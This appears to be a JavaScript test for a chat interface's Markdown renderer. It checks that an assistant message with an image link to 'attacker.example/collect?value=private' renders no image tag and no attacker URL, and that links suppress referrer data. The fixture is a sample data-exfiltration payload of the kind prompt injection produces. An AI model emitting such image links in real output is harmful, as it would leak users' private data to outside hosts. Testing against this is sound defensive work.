import assert from 'node:assert/strict';
import { fileURLToPath } from 'node:url';
import React from 'react';
import { renderToStaticMarkup } from 'react-dom/server';
import { createServer } from 'vite';

// Exercise the real Markdown renderer: a model-created image must not trigger a browser request.
const root = fileURLToPath(new URL('..', import.meta.url));
const server = await createServer({ root, server: { middlewareMode: true }, appType: 'custom' });
try {
  const { default: Chat } = await server.ssrLoadModule('/src/components/Chat.tsx');
  const html = renderToStaticMarkup(React.createElement(Chat, {
    messages: [{ role: 'assistant', text: '![private data](https://attacker.example/collect?value=private) [Docs](https://learn.microsoft.com)' }],
    busy: false, draft: '', onSend() {}, onStop() {}, onExport() {}, onReview() {}, setDraft() {}
  }));
  assert.ok(!html.includes('<img'), 'Model Markdown must not render automatic image requests.');
  assert.ok(!html.includes('attacker.example'), 'The external image URL must not be emitted.');
  assert.ok(html.includes('noopener noreferrer'), 'Links must prevent referrer and opener access.');
  assert.ok(html.includes('referrerPolicy="no-referrer"'), 'Links must suppress referrer data.');
  assert.ok(!html.includes('Public web search'), 'Public search must not require a checkbox.');
  assert.ok(!html.includes('Start a new conversation for public'), 'Public research must work in the current conversation.');
  console.log('Guardrail UI checks passed: safe Markdown rendering; no web-search checkbox or conversation block.');
} finally {
  await server.close();
}
